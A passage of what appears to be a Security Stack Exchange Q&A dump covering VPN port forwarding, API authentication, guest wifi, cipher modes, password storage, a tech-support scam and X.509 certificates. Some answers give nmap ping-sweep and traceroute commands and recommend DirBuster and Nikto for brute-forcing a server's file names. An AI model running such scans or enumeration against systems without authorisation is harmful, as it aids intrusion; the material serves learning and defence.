  For example, suppose that you want to run a web server behind our VPN,
  or that you wish to receive incoming connections to your BitTorrent
  client in order to improve p2p performance, or to seed a file. Without
  at least one remotely forwarded port, your service could not be
  reached from the outside, because our VPN server would reject the
  proper packets to your service.</p>
  
  <p>Usually this is a good security measure against attacks, but it
  prevents your services to be reached from the Internet.</p>
  
  <p>When you remotely forward a port, our servers will open that port
  (TCP, UDP or both, according to your selection) and will properly
  forward incoming packets to you on that port.</p>
  
  <p>You can forward up to 20 ports simultaneously. You can do that on our
  website. You can't forward ports lower than 2048. You can map a
  remotely forwarded port to a different local port: this is useful for
  a variety of cases, for example when your service listens to a port
  lower than 2048 or when it is already reserved.</p>
  
  <p>IMPORTANT: do NOT forward on your router the same ports you use on
  your listening services while connected to the VPN. Doing so exposes
  your system to correlation attacks and potentially causes uncencrypted
  packets to be sent outside the tunnel from your client.</p>
</blockquote>
","<p>That's the worst possible advice; and, doesn't answer what the OP wants to really know.  If you get a standard VPN provider and you attempt to forward your ports via your Internet router, you're leaving yourself completely exposed to ""real"" malicious attacks; especially if you forward common ports such as port 80, 443, etc; even if they're SSL'ed!  I tested this a few weeks ago.. some very popular VPN services are completely infested with automated vulnerability scanners and respective attacks.</p>

<p>The difference between AirVPN and other VPN providers is that they allow for a much safer way to forward your port (done on their servers instead of on your router); which doesn't completely leave you vulnerable to port-scans and respective attacks.  This is particularly useful for people who host web sites and other Internet services.</p>

<p>So, if you're forwarding ports, you had better do it with a VPN that's setup for doing this.  Most don't advertise this too well; so, you have to specifically ask for ports to be forwarded for you (these accounts are usually referred to as ""dedicated"" or ""private"" VPNs.</p>
","33241"
"Security for REST api (user/pass auth vs hmac vs oauth)","17342","","<p>I have two servers (one on Hetzner (I am calling it H) and other in my office (calling it O) ). I need to run a basic CRUD web service on O and the only consumer of the service is H. Data on O is sensitive user data. This is a temporary duct tape service which will go away in the future along with the need for the server O. </p>

<p>Here is what I have in mind:</p>

<ol>
<li>Service will run on https</li>
<li>Basic HTTP auth for request authentication</li>
<li>Opening the port on O only for H's ip via iptables.</li>
</ol>

<p>I would like to know if it sounds secure enough or if there is anything I might have overlooked? Are there any advantages that HMAC or OAuth offer over this approach?</p>
","<p><a href=""https://en.wikipedia.org/wiki/Hash-based_message_authentication_code"">HMAC</a> is a cryptographic algorithm which makes sense as part of bigger protocols; you should not fiddle with it directly. When you use HTTPS, the SSL layer actually includes some HMAC (among other algorithms).</p>

<p><a href=""http://en.wikipedia.org/wiki/OAuth"">OAuth</a> is a standard for authorization whose main use case is managing authentication of users without sharing credentials -- the idea being that one user could have <em>credentials</em> (a big word for ""password"") known to a single server, that can be used to be granted access by <em>several</em> other servers without trusting them enough to show them the actual password. Say, servers <em>S</em> and <em>T</em> trust authentication server <em>A</em>, user <em>U</em> also trusts <em>A</em> enough to show it his password (within some HTTPS connection), and <em>S</em> and <em>T</em> talk to <em>A</em> to make sure that user <em>U</em> is indeed who he claims to be; the nice part is that <em>S</em> and <em>T</em> never see the password and <em>U</em> needs not trust <em>them</em>.</p>

<p>In your case, you have a single ""user"" (your server <em>H</em>) and since that's a machine, it needs not be picky about his password; <em>H</em> can have a ""password"" (a long sequence of random characters) which <em>H</em> will use only to authenticate with <em>O</em>, so there is no need for the extra complexity of OAuth.</p>

<p><strong>The inherent vulnerability</strong> here is that server <em>H</em> has access to the sensitive data. That's by design, but this means that the data makes it to an hosted server, which implies that you trust the hosting service for not peeking at your data or leaking it through carelessness. You cannot evade that, as per your problem definition. You basically consider server <em>H</em> to be safe, by itself, from eavesdropping and hostile alterations. Under these conditions, HTTP's ""Basic"" authentication run within HTTPS <em>will be fine</em>.</p>

<p>You might want to tighten a bit server authentication: machine <em>H</em> will need to make sure that it talks to the genuine <em>O</em> server, which normally entails certificate validation. You can configure <em>H</em> to make ""direct trust"", i.e. import in <em>H</em> a copy of <em>O</em>'s certificate (just the public certificate, not the private key), and instructing <em>H</em> to trust that specific certificate and none other. This may avoid issues with Certification Authorities, and, in particular, allows for safe usage of self-signed certificates, which are cheap (since you don't have to pay a CA for such a certificate).</p>
","39789"
"Sharing wifi at a business - Bad Policy?","17335","","<p>Is it safe for a small business to let customers use their wifi while waiting?</p>

<p>My friend is starting up a small dentistry practice (1 dentist), and I'm setting up his computers/wifi as a favor.  He'll have a waiting room and wants it to be a pleasant experience for his customers and thinks the wifi password should be easy so the receptionist can give it to patients.  (Though he doesn't expect patients to wait long or most to ask and expect wifi).</p>

<p>I'm telling him he needs a very strong WPA2 wifi passphrase and to keep it private (his business is in city with other businesses/apartments nearby) or else someone malicious could start openly stealing his wifi and either do illegal things with him liable or <em>just</em> severely slow down their connection (which needs to be fast; they plan on using cloud-based services).</p>

<p>Is there a secure way to let the public use your wifi that is monitored by non-tech savvy people (once properly setup)?  Or is the only option for small-scale users (without enterprise solutions) to just not allow random users on their wifi?</p>

<p>Simple MAC address filtering is probably too burdensome on the receptionist (getting patient to find MAC on their device; typing it correctly; and removing it after the patient leaves).</p>

<p>Would it be possible to say have a whitelist of a few MAC addresses that we use; and allow other MAC addresses ~2 MB of unrestricted bandwidth at which point their connection starts getting severely throttled?  Or is it possible to setup a scheme to generate one-time passwords that will expire after the first of ~2MB or 2 hrs of use?</p>
","<p>Letting guests come on your network is not a good idea. But this has already been said.</p>

<p>A major point that must must be remarked is that even for guests, you need identification and authentication. In fact (I am not aware of your laws) you want to make sure to be able to track back any user of your WiFi in case of a legal problem. If someone comes and tells you: ""You have hacked our systems,"" you need to know who did it.</p>

<p>If I had to choose a solution, I would go for a <a href=""http://en.wikipedia.org/wiki/Captive_portal"" rel=""nofollow noreferrer"">captive portal</a> that wouldn't allow anyone to access the internet unless provided with credentials. Therefore you (or the receptionist) could issue credentials for guests and register them into your database. These credentials would be time-limited on purpose. </p>
","6551"
"Block chaining modes to avoid","17321","","<p>Everyone knows that ECB operation mode with a block cipher should be avoided because of clear and obvious weaknesses. But little attention is given to comparison of the other modes in the context of security, and people instead appear to simply prefer the oldest mode: CBC.</p>

<p><strong>Are there security caveats with respect to other common operation modes?</strong> This is specifically in the context of stream encryption rather than special-purpose functions that might have very specific operational requirements (<em>i.e. TrueCrypt et.al.</em>). </p>

<p>For example, the simplicity of OFB mode is appealing as it completely masks the nature of the underlying block cipher, turning into an easy-to-use stream cipher. But the fact that the cipher ""output"" is directly XORed with the plaintext to produce the ciphertext is vaguely unsettling, and smells like there's room for a chosen plaintext vulnerability.</p>

<p><strong>Of the common operation modes, are there any that we should avoid for stream encryption</strong>, or situations in which we should avoid any given one of them, or reasons to prefer one over another? Besides ECB, of course.</p>

<p>Specifically, CBC, OFB, and CFB operation modes, as those are nearly universally supported. And possibly CTR 'cause everyone knows what it is.</p>
","<p>OFB and CTR turn the block cipher into a stream cipher. This means that care must be taken when using them, like for <a href=""http://en.wikipedia.org/wiki/RC4"">RC4</a>; reusing the same stream for encrypting two distinct messages is a deadly sin. OFB is more ""delicate"" in that matter. Since OFB consists in encrypting the same value repeatedly, it is, in practice, an exploration of a <a href=""http://mathworld.wolfram.com/PermutationCycle.html"">permutation cycle</a>: the IV selects a point and OFB walks the cycles which contains this point. For a block cipher with block size <em>n</em> bits, the <strong>average</strong> size of a cycle should be around <em>2<sup>n/2</sup></em>, and if you encrypt more than that, then you begin to repeat a previous segment of the stream, and that's bad. This can be a big issue when <em>n = 64</em> (e.g. you use 3DES). Moreover, this is an average: you can, out of (bad) luck, hit a smaller cycle; also, if you encrypt two messages with the same key but distinct IV, you could (there again if unlucky) hit the same cycle than previously (only at a different point).</p>

<p>The bad point of OFB is that it is hard to test for these occurrences (if the implementation includes the necessary code, it can test whether these unwanted situations occur, but this cannot be done <em>in advance</em>, only when part of the encryption has already been done). For CTR, things are easier: CTR is encryption of successive counter values; trouble begins when a <em>counter value</em> is reused. But a counter behaviour is easy to predict (it is, after all, a counter) hence it is much easier to ensure that successive messages encrypted with the same key use distinct ranges of counter values.</p>

<p>Also, when encrypting with CTR, the output begins to be distinguishable from pure random after about <em>2<sup>n/2</sup></em> blocks, but that's rarely lethal. It is a worry and is sufficient to warrant use of block ciphers with big blocks (e.g. AES with 128-bit blocks instead of 3DES and its 64-bit blocks), but that's a more graceful degradation of security than what occurs with OFB.</p>

<p>To sum up, <strong>don't use OFB; use CTR instead</strong>. This does not make CTR easy to use safely, just easier. To avoid botching it, you should try to use one if the nifty <a href=""http://en.wikipedia.org/wiki/Authenticated_encryption"">authenticated encryption modes</a> which do things properly and include integrity check, a necessary but often overlooked component. <a href=""http://en.wikipedia.org/wiki/EAX_mode"">EAX</a> and <a href=""http://en.wikipedia.org/wiki/Galois/Counter_Mode"">GCM</a> are my preferred AE modes (EAX will be faster on small architectures with limited L1 cache, GCM will be faster on modern x86, especially those with the <a href=""http://en.wikipedia.org/wiki/AES_instruction_set"">AES opcodes</a> which were defined just for that).</p>

<p>To my knowledge, CFB does not suffer as greatly as OFB from the cycle length issues, but encrypting a long sequence of zeros with CFB is equivalent to OFB; therefore, it seems safer <strong>to prefer CTR over CFB</strong> as well.</p>

<p>Almost all block cipher modes of operation have trouble when reaching the <em>2<sup>n/2</sup></em> barrier, hence it is wise to use 128-bit blocks anyway.</p>

<p><strong>Note:</strong> CFB and OFB have an optional ""feedback length"". Usually, we use full-block feedback, because that's what ensures the maximum performance (production of <em>n</em> bits of ciphertext per invocation of the block cipher). Modes with smaller feedback have also been defined, e.g. CFB-8 which encrypts only one byte at a time (so it is 8 times slower than full-block CFB when using a 64-bit block cipher). Such modes are not as well supported by existing libraries; also, small feedback loops make the OFB issues worse. Therefore, I do not recommend using CFB or OFB will less than full block feedback.</p>

<hr />

<p>As pointed out by @Rook: CBC mode, like ECB but unlike CFB, OFB and CTR, processes only full blocks, therefore needs <strong>padding</strong>. Padding can imply <a href=""http://en.wikipedia.org/wiki/Padding_oracle_attack"">padding oracle attacks</a>, which is bad (arguably, a padding oracle attack is possible only if no MAC is used, or is badly applied; the proper way being encrypt-then-MAC). For this reason, padding-less modes are preferable over CBC.</p>

<p>This leads us to a clear victory of CTR over other modes, CFB being second, then CBC and OFB in a tie, then ECB (this is a bit subjective, of course). But, really, use EAX or GCM.</p>
","27780"
"How do I use nmap to scan a range of IPv6 addresses?","17300","","<p>I need to scan a range of IPv6 addresses with Nmap, but I'm not sure how to do this. When scanning for an IPv4 range, I would usually do this:</p>

<pre><code>nmap -sP 192.168.*.*
</code></pre>

<p>or</p>

<pre><code>nmap -sP 192.168.1.*
</code></pre>

<p>but if I need to do this with an IPv6, how would I do it?</p>
","<p>I would assume that the range you are trying to scan is <code>fe80:0000:0000:0000:0000:0000:0000:0000/112</code> which is the last 16 bits (the last <em>section</em>) of the address.  That range includes 65,536 IPv6 addresses, probably all of which are going to time out when scanned.  It will probably take most of a day (86,400 seconds - close enough to 65,536 at one second per timeout on average) just to ping that range to determine whether the machines are up or not.</p>

<p>But such small ranges are rarely seen.  ISPs are often handing customers a /64 range each, (and it seems this is what <em>you</em> have) meaning that the customer has 18,446,744,073,709,551,616 individual IPv6 addresses.  Scanning a single customer like this would take years.</p>

<p>There are <a href=""http://en.wikipedia.org/wiki/Neighbor_Discovery_Protocol"" rel=""nofollow noreferrer"">discovery protocols</a> that exist to allow you to find the exact IP address you need rather than scanning the entire range and these might be a better place to start.</p>

<hr>

<p>There are some existing answers here that may still help: <a href=""https://security.stackexchange.com/questions/12826/which-tool-apart-from-nmap-can-i-use-to-scan-a-range-of-ipv6-addresses"">Which tool (apart from nmap) can I use to scan a range of IPv6 addresses?</a></p>
","51524"
"Can JavaScript be used to capture the user's screen?","17284","","<p>Can JavaScript be used to capture the user’s screen? If so, is this functionality available in any JS framework?</p>

<p>(I do not need code examples: I am mainly asking to form an opinion about the security capabilities of JavaScript.)</p>
","<p>JavaScript has full access to the document object model, so at least in theory, it could capture what's on its own web page (but not anything outside the browser window) and there's a library to do that: <a href=""http://html2canvas.hertzen.com/"">http://html2canvas.hertzen.com/</a>  (I haven't tried it.)  </p>

<p>The <a href=""http://en.wikipedia.org/wiki/Same-origin_policy"">same-origin policy</a> prevents JavaScript from accessing the DOM of another site. Since JavaScript cannot access the DOM of another site, it cannot leak material from the other site.  So, if your question boils down to whether a script running in one tab, or even an iframe, can capture the banking password from elsewhere in the browser, then no, provided same-origin is properly implemented in the browser itself.</p>

<p><em>Same origin</em> applies to domain from which the <em>page</em> was served, not from which the script was served.  So, my page at <a href=""http://bbrown.spsu.edu/"">http://bbrown.spsu.edu/</a> (it's not interesting) can load a script from google-analytics.com, as it does, and that script has access to the DOM of the page from which it was loaded; it can also send stuff back to Google through a bit of sleight-of-hand.  The point is, it can do that only because I trusted Google Analytics enough to load their script in my page; the code that loads the page is in markup I wrote.  If you load my page into your browser, that script from google-analytics.com can see only the DOM of <em>my</em> page in your browser, and not anything else you may have open in your browser.</p>
","73648"
"School asked us to submit our MAC addresses","17277","","<p>My school has recently asked us to submit our MAC address to the school along with our designated name to be used to connect to the Wi-Fi. Previously this wasn't needed. </p>

<p>I would like to ask about what kind of information that they can collect from this? Would they be able to track our browsing history or more? What if I use Tor Browser? Would it have any effect?</p>

<p>If they can track me, what measures can I take to prevent them from invading my privacy? </p>
","<p>I think you should ask why they want to use the MAC address, not necessarily for privacy reasons; ""why do you need the MAC Address?"" I think it's a reasonable question to ask them.</p>

<p>Firstly, they will have MAC addresses of all the individuals who connect to the WiFi. Any device connecting to the WiFi will reveal their MAC address, based on the ARP protocol. </p>

<p>They may think locking down WiFi to known MAC addresses is a good security measure. It's not really because I can obtain your MAC address if both of us are in the same Starbucks and on the same WiFi. I can then spoof your MAC address quite easily. So from a security measure this is not great.</p>

<p>They may want to track your activity. They can do this already without asking for your MAC, just giving them the MAC address allows them to map it to a individual easier. They can get a history of MAC &amp; IP address from logs and  their NAT can keep a history of IP Address &amp; Ports and map back to the MAC address.</p>

<p>If you use Tor, they will be able to say you used Tor, but not the content.</p>

<p>So, I would ask why do you want my MAC address, giving out the MAC address is not going to really affect you. Unless of course on your home WiFi or something else you are using MAC address as a method to identify yourself; as MAC address can be easily spoofed. </p>
","132904"
"How is an X509 certificate signer verified?","17267","","<p>Lets say I create a self-signed X509 certificate A and use it to issue certificate B. I put certificate A in my trusted root authorities so that all certificates signed by it are accepted. My question is:</p>

<p>When I then use a service protected by cert B, how does my computer know it was actually signed by cert A? Is the parent certificate somehow embedded into its child? </p>
","<p>In a <a href=""http://tools.ietf.org/html/rfc5280"">X.509</a> certificate, the name of the issuer (in your example, A's name) is also included (as <code>issuerDN</code>). Also, a certificate can contain an extension which points to a place where the issuer's certificate can be downloaded (the ""Authority Information Access"", section 4.2.2.1 of RFC 5280); note that since all certificates are signed entities which are accepted and use only after having verified these signatures, they can be downloaded and transported with little care. Finally, it is customary, in protocols where a party can show a certificate, to actually show a <em>list of certificates</em> containing needed intermediate CA certificates. This is what happens, for instance, in an SSL <code>Certificate</code> message.</p>

<p>All this gives a lot of ways for a computer to do <a href=""http://tools.ietf.org/html/rfc4158"">certification path building</a>, i.e. reconstructing chains of certificate on which validation (including verifying cryptographic signatures) seems relevant.</p>
","20870"
"How can I see traceroute details in NMAP?","17262","","<p>I'm using NMAP for Network scan ;</p>

<p>The output does not contain the full traceroute details. Can I view all intermediate routers/hosts using the NMAP GUI?</p>

<p>A simple VPN connection IP traceroute...</p>

<p><img src=""https://i.stack.imgur.com/ro2t0.jpg"" alt=""LA simple Vpn connection ;""></p>

<p>Thanks your answers...</p>
","<p>Try with this command</p>

<pre><code>nmap -sn --traceroute &lt;remote_ip&gt;
</code></pre>

<p>And lookup these:</p>

<p><a href=""https://serverfault.com/questions/432017/whats-going-on-with-traceroute"">https://serverfault.com/questions/432017/whats-going-on-with-traceroute</a></p>

<p><a href=""https://svn.nmap.org/nmap/zenmap/share/zenmap/config/scan_profile.usp"" rel=""nofollow noreferrer"">https://svn.nmap.org/nmap/zenmap/share/zenmap/config/scan_profile.usp</a></p>

<p><a href=""http://seclists.org/basics/2011/Mar/19"" rel=""nofollow noreferrer"">http://seclists.org/basics/2011/Mar/19</a></p>
","38974"
"Is it secure to store passwords with 2 way encryption?","17248","","<p>I'm a parent who has a parent account with my local school district so that I can log in to their website to view my child's grades etc.</p>

<p>I clicked the ""forgot password' button, and my password was emailed to me in plain text.  This concerned me, so I emailed the principal, including some links from the <a href=""http://plaintextoffenders.com/about/"" rel=""noreferrer"">bottom of this page</a>.  This is the reply I received from the organization's IT department:</p>

<blockquote>
  <p>Parent passwords are not stored in plain text. They are encrypted. Not
  a 1 way encryption but a 2 way encryption. This is how the system is
  able to present it back via an email through Ariande's CoolSpool
  utility.</p>
  
  <p>For support reasons, the parent password is visible to certain staff
  until the parent has successfully signed in 3 times. After that, no
  staff can see that password. However, it is stored in such a way that
  the system itself can send it back to the verified email.  In the
  future after a parent's 3 successful sign ins, if they forget their
  password, their verified email account will be sent a link to reset
  their password, this change is in the works.</p>
</blockquote>

<p>Does this explanation justify the plain text password being sent by email, and are my passwords secure with them?</p>

<p>If not, what references or resources could I reply to them with?</p>
","<p>No, this is not a good practice. There are two distinct problems.</p>

<ul>
<li><p>encrypting the password instead of hashing it is a bad idea and is borderline storing plain text passwords. The whole idea of slow hash functions is to thwart the exfiltration of the user database. Typically, an attacker that already has access to the database can be expected to also have access to the encryption key if the web application has access to it.</p>

<p>Thus, this is borderline plaintext; I almost voted to close this as a duplicate of <a href=""https://security.stackexchange.com/a/117606/92273"">this question</a>, because this is almost the same and the linked answer applies almost directly, especially the bit about plaintext offenders; there is <a href=""https://security.stackexchange.com/a/117881/92273"">another answer</a> about plaintext offenders as well.</p></li>
<li><p>sending the plain text password via plain text email is a bad idea. They could argue that there is no difference when no password reuse happens, but I doubt they would even know what that is and why it’s considered bad practice. Also, password reuse is so common that that wouldn’t be a good answer.</p></li>
</ul>

<p>Additionally, as they seem to be working on the second part (even though password reset links in plain text emails are in the same ballpark, i.e. a threat that can read the password from the plain text mail can also read the link, maybe before you can), you could explain them the problem about not hashing from my answer, also feel free to link <a href=""https://security.stackexchange.com/a/174126/92273"">this answer</a> directly.</p>

<p>Maybe even explain that encryption is one way, but can always be reversed by the inverse function of the crypto system in question, aptly named decryption. Using terms like ""one way encryption"" and ""two way encryption"" rather than ""hashing"" and ""encryption"" shows a lack of understanding.</p>

<p>The real problem is: them implementing a password reset does not mean they will hash (correctly) in the future; there is not much you can do about this except using a password manager and create a long, strong passphrase that is unique for this site and hope for the best.</p>

<p>This is especially true since they seem to want to keep the part of their system that tells staff your password (for absolutely <strong>no</strong> good reason). The implication being they keep not hashing properly - them saying staff can only see the password in that three login timeframe is not true; if the web app can access the key, so can the administrative staff. Maybe no longer the customer support staff but they shouldn’t be able to see it in the first place. That is horrifically bad design.</p>

<p>Depending on your location, schools as being part of the public sector have obligations to have a CISO you can contact directly, expressing your concerns. And as usual in the public sector, there ought to be an organization that is supervising the school; they should have a CISO at least, who might be quite interested in this proceeding.</p>
","174126"
"When using AES and CBC, is it necessary to keep the IV secret?","17233","","<p>If I encrypt some data with a randomly generated Key and Initialization Vector, then store all three pieces of information in the same table row; is it necessary to encrypt the IV as well as the Key?</p>

<p>Simplified table structure:</p>

<ul>
<li>Encrypted data</li>
<li>Key (encrypted using a second method)</li>
<li>IV (encrypted?)</li>
</ul>

<p>Please assume that the architecture and method are necessary: The explanation behind it is lengthy and dull.</p>
","<p>From <a href=""http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation#Initialization_vector_.28IV.29"">Wikipedia</a>:</p>

<blockquote>
  <p>An initialization vector has different security requirements than a key, so <strong>the IV usually does not need to be secret</strong>. However, in most cases, <strong>it is important that an initialization vector is never reused under the same key</strong>. For CBC and CFB, reusing an IV leaks some information about the first block of plaintext, and about any common prefix shared by the two messages.</p>
</blockquote>

<p>You don't need to keep the IV secret, but it must be random and unique.</p>
","17046"
"Wife was conned into allowing her computer to be hacked, what do I do?","17232","","<p>My wife had a popup on her old Windows Vista laptop (which I've been threatening to switch to Ubuntu Linux). It appeared to come from our ISP, and informed her that she was hacked, and to call a number. An Indian guy answered, told her to go to a site (<code>lmi1.com</code>), gave her a code, and told her to input it to download a program and run it, <strong>which she did.</strong> He told her she was hacked and it would cost lots of money to fix.</p>

<p>That was when she finally decided to call me at work, and after she <em>finally</em> told me about downloading the program, I immediately told her to disconnect it from the internet and turn it off. I told her to call our ISP to confirm that it was a scam/hack. They confirmed that it was not associated with them. We have an always on connection, which might explain why they targeted us.</p>

<p>She told me she was already logged in to her gmail account, but didn't log into any accounts after her interaction with this hacker. </p>

<p>I've been to the bank to shut down internet access for our bank accounts until we can deal with this further, and confirmed that the accounts were not accessed online since well before the attack.</p>

<p>We're going to back up her files (via a Linux live-desktop), and she's getting a bright shiny new operating system by the end of the weekend, and she won't be using the laptop until then.</p>

<p>My question is: <strong>What should we do now?</strong> </p>

<p>We don't need new bank account numbers, I think that would be an impotent action regardless, right?</p>

<p>It's conceivable they accessed her email from her computer (since she was logged in). </p>

<p>It's possible they downloaded files.  I don't know if she had anything with social security numbers on it, but she might.</p>

<p>It's possible they began encrypting her files for the purpose of blackmailing her with their possible destruction, and she may have lost some of them.</p>

<p>I've told her to change her passwords on her email accounts. She mostly uses Google Chrome, not sure if that makes a difference. </p>

<p>Ancillary question: why doesn't the FBI shut down sites like <code>lmi1.com</code>?</p>

<p>Update: they called her back, and hung up after being challenged to give their address. I'm not sure what their angle is. If it's just an outright scam, that's it, no harm done. But they could try to mess with us. I don't think anyone would go to this much trouble to set up a zombie for a bot-net, would they? I wish I knew. </p>

<p><strong>Update</strong> I understand lmi1.com is a legit website, but wouldn't they still have the opportunity to use the connection to surreptitiously install malware?</p>

<p><strong>2nd Update</strong> My wife informed me she watched him download and install a file she called ""system configuration"" so they installed something. Don't know what.</p>
","<p>See the FTC page on <a href=""https://www.consumer.ftc.gov/articles/0346-tech-support-scams"" rel=""nofollow"">Tech Support Scams</a>:</p>

<blockquote>
  <p>In a recent twist, scam artists are using the phone to try to break into your computer. They call, claiming to be computer techs associated with well-known companies like Microsoft. They say that they’ve detected viruses or other malware on your computer to trick you into giving them remote access or paying for software you don’t need.</p>
  
  <p>These scammers take advantage of your reasonable concerns about viruses and other threats. They know that computer users have heard time and again that it’s important to install security software. But the purpose behind their elaborate scheme isn’t to protect your computer; it’s to make money.</p>
</blockquote>

<p>They document this class of scam thoroughly, and the page includes good information on how to act effectively in the event that you have already fallen victim. I have mirrored the content of that section below, but show your wife that page so she doesn't feel stupid.</p>

<blockquote>
  <p><strong>If You’ve Responded to a Scam</strong></p>
  
  <p>If you think you might have downloaded malware from a scam site or allowed a cybercriminal to access your computer, don’t panic. Instead:</p>
  
  <ul>
  <li><a href=""https://www.consumer.ftc.gov/articles/0011-malware"" rel=""nofollow"">Get rid of malware</a>. Update or download legitimate security software
  and scan your computer. Delete anything it identifies as a problem. </li>
  <li>Change any passwords that you gave out. If you use these passwords for other accounts, change those accounts, too.</li>
  <li>If you paid for bogus services with a credit card, call your credit card provider and ask to reverse the charges. Check your statements for any other charges you didn’t make, and ask to reverse those, too.</li>
  <li>If you believe that someone may have accessed your personal or financial information, visit the FTC’s <a href=""https://www.ftc.gov/bcp/edu/microsites/idtheft2012/"" rel=""nofollow"">identity theft website</a>. You can minimize your risk of further damage and repair any problems already in place.</li>
  <li>File a complaint with the FTC at <a href=""https://ftc.gov/complaint"" rel=""nofollow"">ftc.gov/complaint</a>.</li>
  </ul>
</blockquote>

<p>I can't speak to the efficacy of this, but I do recommend pursuing that last bullet: <a href=""https://www.ftc.gov/complaint"" rel=""nofollow"">file a complaint</a>.</p>

<p>Filing a complaint enables them to provide all interested and capable bureaus with critical information needed to at least <em>defer</em> future scams by the same attacker, e.g. if a U.S. phone number was provided then the FTC (or more likely some other bureau) will probably be able to seize the number and ensure that it cannot be used again for this purpose. I doubt the attacker is based in the States, but if they <em>are</em> then further justice <em>might</em> even occur; if not, that would probably be the extent of justice served on this.</p>

<p>All of that said, the FTC is a good agency; they do what they can. Hit them up for sure.</p>
","80595"
"Is it possible make brute-force attacks ineffective by giving false positive answers to failed log-in attempts?","17218","","<p>I don't have any experience or scientific knowledge in security, I just wanted to ask if this is possible because I am interested in it.</p>

<p>What if I encrypt data and every password decrypts it, but only the right one does not create pointless data clutter?
Same could be done with a login: false login data leads to fake, dummy accounts and only the right login details get you to the right accounts.</p>

<p>Wouldn't this be a way better method of encryption because you couldn't just try out passwords but had to look at the outcome to see if it was the right one?</p>
","<p>The answer always depends on your threat model.  Security is always woven into a balance between security and usability.  Your approach inconveniences the hackers trying to break into the account, but also inconveniences a user who merely mistypes their password.  If the fake account is believable enough to fool an attacker, it may also be believable enough to fool a valid user.  That could be very bad.</p>

<p>This may be desirable in extremely high risk environments.  If you had to store nuclear secrets out in the open on the internet, having every failed password lead you to an account that has access to fake documents which don't actually reveal national secrets could be quite powerful.  However, for most cases it is unnecessary.</p>

<p>You also have to consider the alternatives.  A very popular approach is to lock the account out after N attempts, which basically stops all brute force attempts cold, and has usability behaviors that most users are willing to accept.</p>
","129901"
"Scan all possible files on server (Brute force Filenames)","17218","","<p>I'm looking for a tool which can scan all possible filename combinations on a server and tells you what filenames the server responded to.</p>

<p>So it would try something like: <code>example.com/a</code>, <code>example.com/b</code>, ... , <code>example.com/css</code>, ... .</p>

<p>It would the check if the answer from the server is a 403 or something like that and try the next one.</p>
","<p>Check out <a href=""https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project"" rel=""nofollow"">DirBuster</a> where you can feed wordlists and it'll try to brute force file and directory names.</p>

<p><a href=""https://cirt.net/Nikto2"" rel=""nofollow"">Nikto</a> also checks for commonly used folder and file names on a web server.</p>

<p>It is not possible to check every file and folder name, however running the above tools will give you a decent amount of enumeration.</p>
","79259"
"Is it safe to allow users multiple login at different browsers & computers?","17213","","<p>We are currently developing a web application. The developers have allowed multiple login. e.g an user can log-in to multiple computers at the same time. They are quoting Gmail account as an example of allowing multiple access.</p>

<p>We have secured our web application similar to <a href=""https://security.stackexchange.com/questions/4674/is-this-login-security-enough"">here.</a></p>

<p>Does allowing multiple login at different computers/browsers increase vulnerability to hacks? If yes, how can I explain this to the developers?  </p>
","<p>There is a good reason for preventing concurrent connections - if they are not needed by your users.</p>

<p>A good rule of thumb is to not allow more functionality than that which is needed. If your users are never going to connect more than one simultaneous session, disallowing it would reduce the risk of attack (as an attacker would not be able to conduct their attack while the user was logged in.)</p>

<p>If, however, your users may expect to use multiple sessions, then you'll have to have this functionality. </p>

<p>Really, this question comes down to a functionality issue - google know their users may need to connect from multiple machines/locations/browsers at the same time, so they just notify of other sessions, rather than prohibit them.</p>
","34883"
"Does an established HTTPS connection mean a line is really secure?","17165","","<p>From the view of somebody offering a web application, when somebody connects with TLS (https) to our service and submits the correct authentication data, is it safe to transmit all sensitive data over this line, or can it be that there is still eavesdropping?</p>

<blockquote>
  <p>This question was <strong><a href=""https://security.meta.stackexchange.com/questions/356"">IT Security Question of the Week</a></strong>.<br/>
  Read the Jul 29, 2011 <strong><a href=""http://security.blogoverflow.com/2011/07/qotw-3-does-an-established-ssl-connection-mean-a-line-is-really-secure/"" rel=""nofollow noreferrer"">blog entry</a></strong> for more details or <strong><a href=""https://security.meta.stackexchange.com/questions/tagged/qotw?sort=newest"">submit your own</a></strong> Question of the Week.</p>
</blockquote>
","<p>It's important to understand what SSL does and does not do, especially since this is a very common source of misunderstanding. </p>

<ul>
<li>It encrypts the channel</li>
<li>It applies integrity checking</li>
<li>It provides authentication</li>
</ul>

<p>So, the quick answer should be: ""yes, it is secure enough to transmit sensitive data"". However, things are not that simple.    </p>

<ul>
<li>The newest versions of SSL - version 3, or better yet: TLS, even TLS 1.2, are definitely better than previous versions. E.g. SSL 2 was relatively easy to MITM (Man in the middle). So, first it depends on protocol version.   </li>
<li>Both the channel encryption and the integrity checking are configurable in the protocol, i.e. you can choose which algorithms to use (cipher suite). Obviously, if you're using RSA1024/SHA512 you're much better off... However, SSL even support a mode of NULL encryption - i.e. no encryption at all, just wrapping the requests up to tunnel over SSL protocol. I.e., no protection. (This is configurable both at the client and the server, the selected cipher suite is the first matching set according to the configured order).   </li>
<li>Authentication in SSL has two modes: server-authentication only, and mutual authentication (client certificates). In both cases, the security ensured by the cryptographic certificates is definitely strong enough, however the validity of the actual authentication is only as good as your validity checks: Do you even bother checking the certificate? Do you ensure its validity? Trust chain? Who issued it? Etc.    </li>
<li>This last point re authentication is a lot easier in web <em>applications</em>, wherein the client can easily view the servers certificate, the lock icon is easily viewable, etc. With Web <em>Services</em>, you usually need to be more explicit in checking its validity (depending on your choice of platform). Note that this same point has tripped up so many mobile apps - even if the app developer remembered to use only TLS between the phone and the server, if the app doesn't explicitly verify the certificates then the TLS is broken.  </li>
<li>While there are some mostly theoretical attacks on the cryptography of SSL, from my PoV its still plenty strong enough for almost all purposes, and will be for a long time.    </li>
<li>What is actually done with the data at the other end? E.g. if its super-sensitive, or even credit card data, you dont want that in the browsers cache, or history, etc.</li>
<li>Cookies (and thus authentication) can be shared between a secure, SSL channel, and a non-secure HTTP channel - unless explicitly marked with the ""secure"" attribute.</li>
</ul>

<p>So, shorter answer? Yes, SSL <em>can</em> be secure enough, but (as with most things) it depends how you use it. :)</p>
","21"
"What is the use of cross signing certificates in X.509?","17148","","<p>In X.509 architecture what are the uses of cross signing certificates from other hierarchy? </p>

<p>Does it just expand trust?</p>

<hr>

<p>So from the answer I am assuming that if CA3 is cross signed by CA2 (from another hierarchy) and CA1 (a parent in its own hierarchy) whose private key is used to encrypt the authentication hash in the certificate of CA3?</p>
","<p>It's about expanding trust, yes. If you trust both CA1 and CA2, and a cert is signed by both, you've got a very high level of trust because two seaparate entities that you trust have verified the cert.</p>

